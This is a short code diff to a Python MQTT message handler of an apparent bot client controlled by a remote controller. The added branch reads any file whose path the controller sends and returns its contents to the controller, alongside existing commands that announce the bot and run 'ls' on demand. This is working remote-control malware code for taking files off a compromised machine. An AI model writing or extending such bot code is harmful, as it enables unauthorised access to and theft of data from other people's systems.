@@ -26,6 +26,14 @@ def on_message(client, userdata, msg):
         try :
             if action == CMD_ANNOUNCE_BOT:
                 result = f"Bot {BOT_ID} is online."
+            elif action == CMD_COPY_FROM_BOT_TO_CONTROLLER:
+                try:
+                    with open(argument, "rb") as f:
+                        # Use a prefix so the controller knows this is a file download
+                        file_data = f.read().decode(errors='replace')
+                        result = f"FILE_DATA:{argument}:{file_data}"
+                except Exception as e:
+                    result = f"Error reading file: {str(e)}"
             elif action == CMD_LIST_FILES:
                 # If argument is empty, just use ['ls'], otherwise ['ls', argument]
                 cmd_list = ["ls", argument] if argument else ["ls"]
